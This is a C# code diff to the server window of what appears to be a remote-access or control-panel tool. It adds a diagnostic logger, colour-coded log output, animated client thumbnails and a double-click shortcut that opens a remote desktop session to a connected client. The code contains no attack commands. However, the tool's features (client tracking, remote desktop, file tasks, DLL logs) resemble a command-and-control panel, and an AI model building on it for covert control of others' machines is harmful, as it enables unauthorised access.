@@ -58,6 +58,19 @@ public partial class ServerWindow : Window
     private int _logLineCount;
     private const int LogMaxLines = 2000;
     private const int LogTrimTo   = 1000;
+    private System.Windows.Documents.Paragraph? _logPara;
+
+    // Coloured log brushes (frozen = thread-safe, allocated once)
+    private static readonly Brush _brushLogError   = MakeBrush(0xEF, 0x44, 0x44);
+    private static readonly Brush _brushLogGood    = MakeBrush(0x4A, 0xDE, 0x80);
+    private static readonly Brush _brushLogDll     = MakeBrush(0x60, 0xA5, 0xFA);
+    private static readonly Brush _brushLogDefault = MakeBrush(0x88, 0x90, 0xB8);
+    private static Brush MakeBrush(byte r, byte g, byte b)
+    {
+        var b2 = new SolidColorBrush(Color.FromRgb(r, g, b));
+        b2.Freeze();
+        return b2;
+    }
     private readonly Dictionary<TextBlock, DispatcherTimer> _counterTimers = new();
     private DispatcherTimer? _searchDebounce;
     private readonly Dictionary<string, Window> _featureWindows = new();
@@ -124,6 +137,11 @@ public partial class ServerWindow : Window
             GridClients.ItemsSource = view;
             RestoreGridColumnWidths();
             SetupGridColumnPersistence();
+
+            // Initialise diagnostic logger (enabled by default)
+            DiagnosticLogger.Init();
+            TxtDevLogsPath.Text = DiagnosticLogger.LogDirectory;
+
             Log("[*] Server ready. Click START to listen.");
             RefreshAllClients();
             LoadConfig();
@@ -420,6 +438,7 @@ public partial class ServerWindow : Window
                 _server.OnLog += msg => Dispatcher.Invoke(() => Log(msg));
                 _server.ClientConnected += c =>
                 {
+                    DiagnosticLogger.ClientConnect(c.Id, c.IP, c.Username, c.OS);
                     // UI update is batched — enqueue and let _batchTimer flush at 150ms intervals
                     _clientQueue.Enqueue((true, c));
 
@@ -448,6 +467,7 @@ public partial class ServerWindow : Window
                 };
                 _server.ClientDisconnected += c =>
                 {
+                    DiagnosticLogger.ClientDisconnect(c.Id, "TCP session closed");
                     NotificationService.NotifyDisconnected(c.Id);
                     // UI update batched — feature window closing handled in FlushClientQueue
                     _clientQueue.Enqueue((false, c));
@@ -3084,6 +3104,20 @@ Read-Host 'Press Enter to close'
         SaveConfig();
     }
 
+    private void SettingsDevLogs_Changed(object sender, RoutedEventArgs e)
+    {
+        bool on = SettingsDevLogs.IsChecked == true;
+        DiagnosticLogger.Enabled = on;
+        if (on) DiagnosticLogger.Info("Diagnostic logging re-enabled by user.");
+        SaveConfig();
+    }
+
+    private void OpenDiagLogsFolder_Click(object sender, RoutedEventArgs e)
+    {
+        try { System.Diagnostics.Process.Start("explorer.exe", DiagnosticLogger.LogDirectory); }
+        catch { }
+    }
+
     // ── AutoTask ────────────────────────────────────
 
     private void AutoTask_AddFile_Click(object sender, RoutedEventArgs e)
@@ -3681,27 +3715,50 @@ Read-Host 'Press Enter to close'
 
     private void Log(string msg)
     {
-        var entry = $"[{DateTime.Now:HH:mm:ss}] {msg}\n";
+        var entry = $"[{DateTime.Now:HH:mm:ss}] {msg}";
         _logLineCount++;
+
+        // Mirror to diagnostic file (never blocks UI — fire and forget)
+        _ = Task.Run(() => DiagnosticLogger.Info(msg));
 
         if (_logLineCount > LogMaxLines)
         {
-            // Trim: read current text (O(n) but happens only every ~1000 lines),
-            // skip past the first LogTrimTo lines, rebuild.
-            var current = TxtLogs.Text;
-            int pos = 0, line = 0;
-            while (pos < current.Length && line < LogTrimTo) { if (current[pos++] == '\n') line++; }
-            TxtLogs.Text = "[...older logs trimmed...]\n" + (pos < current.Length ? current[pos..] : "") + entry;
-            _logLineCount = LogTrimTo + 1;
-        }
-        else
-        {
-            // Inlines.Add is O(1) — avoids re-allocating the entire string on every append.
-            // TxtLogs.Text += was O(n) and froze the UI under high client load.
-            TxtLogs.Inlines.Add(new System.Windows.Documents.Run(entry));
+            // Trim: clear the RichTextBox document and start fresh.
+            TxtLogs.Document.Blocks.Clear();
+            _logPara = null;
+            _logLineCount = 0;
+            var trimNote = new System.Windows.Documents.Run("[...older logs trimmed...]\n")
+            { Foreground = _brushLogDefault };
+            var p = EnsureLogParagraph();
+            p.Inlines.Add(trimNote);
         }
 
-        LogScroller?.ScrollToEnd();
+        var run = new System.Windows.Documents.Run(entry + "\n")
+        {
+            Foreground = GetLogBrush(msg)
+        };
+        EnsureLogParagraph().Inlines.Add(run);
+        TxtLogs.ScrollToEnd();
+    }
+
+    private System.Windows.Documents.Paragraph EnsureLogParagraph()
+    {
+        if (_logPara == null)
+        {
+            _logPara = new System.Windows.Documents.Paragraph { Margin = new Thickness(0) };
+            TxtLogs.Document.Blocks.Add(_logPara);
+        }
+        return _logPara;
+    }
+
+    private static Brush GetLogBrush(string msg)
+    {
+        if (msg.Contains("[!]"))  return _brushLogError;
+        if (msg.Contains("dll", StringComparison.OrdinalIgnoreCase) ||
+            msg.Contains("[DLL]")) return _brushLogDll;
+        if (msg.StartsWith("[+]") || msg.StartsWith("[*]") ||
+            msg.Contains("[+]")   || msg.Contains("[*]"))  return _brushLogGood;
+        return _brushLogDefault;
     }
 
     // ── Window Controls ─────────────────────────────
@@ -3933,7 +3990,59 @@ Read-Host 'Press Enter to close'
             BorderBrush     = new SolidColorBrush(Color.FromRgb(0x1A, 0x1E, 0x36)),
             BorderThickness = new Thickness(1),
             CornerRadius    = new System.Windows.CornerRadius(5),
-            Child = dp
+            Cursor          = System.Windows.Input.Cursors.Hand,
+            Child = dp,
+            RenderTransformOrigin = new System.Windows.Point(0.5, 0.5),
+            RenderTransform       = new System.Windows.Media.ScaleTransform(1.0, 1.0)
+        };
+
+        // ── Hover / click animation ──────────────────────────────────────────
+        border.MouseEnter += (_, _) =>
+        {
+            var st = (System.Windows.Media.ScaleTransform)border.RenderTransform;
+            st.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleXProperty,
+                new DoubleAnimation(st.ScaleX, 1.04, TimeSpan.FromMilliseconds(140)));
+            st.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleYProperty,
+                new DoubleAnimation(st.ScaleY, 1.04, TimeSpan.FromMilliseconds(140)));
+            border.BorderBrush = new SolidColorBrush(Color.FromRgb(0x4A, 0x85, 0xF5));
+            label.Foreground   = new SolidColorBrush(Color.FromRgb(0xCC, 0xD8, 0xFF));
+        };
+        border.MouseLeave += (_, _) =>
+        {
+            var st = (System.Windows.Media.ScaleTransform)border.RenderTransform;
+            st.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleXProperty,
+                new DoubleAnimation(st.ScaleX, 1.0, TimeSpan.FromMilliseconds(200)));
+            st.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleYProperty,
+                new DoubleAnimation(st.ScaleY, 1.0, TimeSpan.FromMilliseconds(200)));
+            border.BorderBrush = new SolidColorBrush(Color.FromRgb(0x1A, 0x1E, 0x36));
+            label.Foreground   = new SolidColorBrush(Color.FromRgb(0xB8, 0xC0, 0xD8));
+        };
+        border.MouseLeftButtonDown += (_, e) =>
+        {
+            var st = (System.Windows.Media.ScaleTransform)border.RenderTransform;
+            st.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleXProperty,
+                new DoubleAnimation(st.ScaleX, 0.97, TimeSpan.FromMilliseconds(70)));
+            st.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleYProperty,
+                new DoubleAnimation(st.ScaleY, 0.97, TimeSpan.FromMilliseconds(70)));
+        };
+        border.MouseLeftButtonUp += (_, e) =>
+        {
+            var st = (System.Windows.Media.ScaleTransform)border.RenderTransform;
+            st.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleXProperty,
+                new DoubleAnimation(st.ScaleX, 1.04, TimeSpan.FromMilliseconds(100)));
+            st.BeginAnimation(System.Windows.Media.ScaleTransform.ScaleYProperty,
+                new DoubleAnimation(st.ScaleY, 1.04, TimeSpan.FromMilliseconds(100)));
+        };
+
+        // Double-click → open Remote Desktop window for this client
+        var capturedId = client.Id;
+        border.MouseLeftButtonDown += (_, e) =>
+        {
+            if (e.ClickCount != 2) return;
+            if (_server?.ConnectedClients.ContainsKey(capturedId) != true) return;
+            var win = new RemoteDesktopWindow(_server!, capturedId);
+            win.Owner = this;
+            win.Show();
         };
 
         ScreenPanel.Children.Add(border);
